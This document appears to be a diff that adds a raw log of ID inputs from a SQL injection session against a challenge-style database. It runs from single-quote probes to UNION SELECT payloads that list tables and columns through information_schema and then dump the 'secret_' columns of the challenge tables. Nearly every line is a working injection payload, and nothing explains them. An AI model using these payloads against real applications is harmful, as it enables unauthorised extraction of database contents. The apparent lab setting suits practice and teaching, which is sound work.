@@ -1,0 +1,30 @@
+ID:1
+ID:1'
+ID:-1' union select 1,2,3 -- 
+ID:
+ID:1
+ID:2
+ID:3
+ID:4
+ID:5
+ID:6
+ID:7
+ID:8
+ID:9
+ID:10
+ID:11
+ID:1
+ID:1'
+ID:1 union select 1,group_concat(table_name),2 from information_schema.tables where table_schema=database() 
+ID:1' union select 1,group_concat(table_name),2 from information_schema.tables where table_schema=database() 
+ID:1' union select 1,group_concat(table_name),2 from information_schema.tables where table_schema=database() -- 
+ID:-1' union select 1,group_concat(table_name),2 from information_schema.tables where table_schema=database() -- 
+ID:-1' union select 1,group_concat(table_name),2 from information_schema.tables where table_schema=database() -- 
+ID:-1' union select 1,group_concat(table_name),database() from information_schema.tables where table_schema=database() -- 
+ID:-1' union select 1,group_concat(column_name),database() from information_schema.columns where table_name='8p4ovony5f' -- 
+ID:-1' union select 1,group_concat(id,":",sessid,":",secret_FFNM,":",tryy),3 from challenges.8p4ovony5f-- 
+ID:-1' union select 1,group_concat(id,":",sessid,":",secret_FFNM,":",tryy),3 from challenges.8p4ovony5f-- 
+ID:-1'union select 1,database(), group_concat(table_name) from information_schema.tables where table_schema=database() -- 
+ID:-1' union select 1,group_concat(table_name),database() from information_schema.tables where table_schema=database() -- 
+ID:-1' union select 1,group_concat(column_name),database() from information_schema.columns where table_name='e3pahu7fo5' -- 
+ID:-1' union select 1,group_concat(secret_TECI),3 from challenges.e3pahu7fo5-- 
